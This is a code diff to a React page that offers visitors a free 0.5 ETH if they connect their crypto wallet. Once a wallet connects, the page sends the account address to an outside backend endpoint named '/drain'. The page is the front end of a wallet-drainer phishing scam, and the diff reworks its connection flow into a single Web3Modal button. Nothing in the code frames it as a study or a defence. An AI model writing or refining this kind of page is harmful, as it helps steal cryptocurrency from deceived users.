@@ -1,5 +1,12 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import ReactDOM from "react-dom/client";
+
+// Web3Modal setup
+const web3Modal = new (window.Web3Modal.default)({
+  network: "mainnet",
+  theme: "dark",
+  cacheProvider: true,
+});
 
 const App = () => {
   const [response, setResponse] = useState(null);
@@ -8,33 +15,21 @@ const App = () => {
     { name: "MetaMask", icon: "https://upload.wikimedia.org/wikipedia/commons/2/2a/MetaMask_icon.svg", id: "metamask" },
     { name: "WalletConnect", icon: "https://walletconnect.com/images/walletconnect-logo.svg", id: "walletconnect" },
     { name: "Coinbase Wallet", icon: "https://upload.wikimedia.org/wikipedia/commons/5/53/Coinbase_Wallet_Logo.png", id: "coinbase" },
-    {
-      name: "Trust Wallet",
-      icon: "https://upload.wikimedia.org/wikipedia/commons/7/75/Trust_Wallet_Logo.png",
-      id: "trustwallet",
-    },
-    {
-      name: "Math Wallet",
-      icon: "https://mathwallet.org/static/images/logo.png",
-      id: "mathwallet",
-    },
-    {
-      name: "TokenPocket",
-      icon: "https://tokenpocket.io/static/images/logo.png",
-      id: "tokenpocket",
-    },
+    { name: "Trust Wallet", icon: "https://upload.wikimedia.org/wikipedia/commons/7/75/Trust_Wallet_Logo.png", id: "trustwallet" },
+    { name: "Math Wallet", icon: "https://mathwallet.org/static/images/logo.png", id: "mathwallet" },
+    { name: "TokenPocket", icon: "https://tokenpocket.io/static/images/logo.png", id: "tokenpocket" },
   ]);
 
-  const connectWallet = async (walletId) => {
+  const connectWallet = async () => {
     setLoading(true);
     setResponse(null);
 
     try {
-      if (!window[walletId]) {
-        throw new Error(`Wallet ${walletId} not supported.`);
-      }
+      const provider = await web3Modal.connect();
+      const web3Provider = new window.Web3.providers.HttpProvider(provider.provider);
+      const web3 = new window.Web3(web3Provider);
 
-      const accounts = await window[walletId].request({ method: "eth_requestAccounts" });
+      const accounts = await web3.eth.requestAccounts();
       const address = accounts[0];
 
       const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
@@ -68,27 +63,19 @@ const App = () => {
         <p className="text-lg mb-8">
           Connect your wallet to claim 0.5 ETH now. It's free and easy!
         </p>
-        <div className="space-y-4">
-          {wallets.map((wallet) => (
-            <button
-              key={wallet.id}
-              onClick={() => connectWallet(wallet.id)}
-              disabled={loading}
-              className={`flex items-center justify-center p-3 rounded-lg transition-all duration-200 ${
-                loading
-                  ? "bg-gray-700 cursor-not-allowed"
-                  : "bg-blue-600 hover:bg-blue-700"
-              }`}
-            >
-              <img
-                src={wallet.icon}
-                alt={wallet.name}
-                className="w-8 h-8 mr-3"
-              />
-              <span className="text-white font-medium">{wallet.name}</span>
-            </button>
-          ))}
-        </div>
+
+        <button
+          onClick={connectWallet}
+          disabled={loading}
+          className={`flex items-center justify-center p-3 rounded-lg transition-all duration-200 ${
+            loading
+              ? "bg-gray-700 cursor-not-allowed"
+              : "bg-blue-600 hover:bg-blue-700"
+          }`}
+        >
+          <span className="text-white font-medium">Connect Wallet</span>
+        </button>
+
         {response && (
           <div className="mt-6 p-4 bg-gray-700 rounded">
             <h3 className="font-bold text-gray-200">Response:</h3>
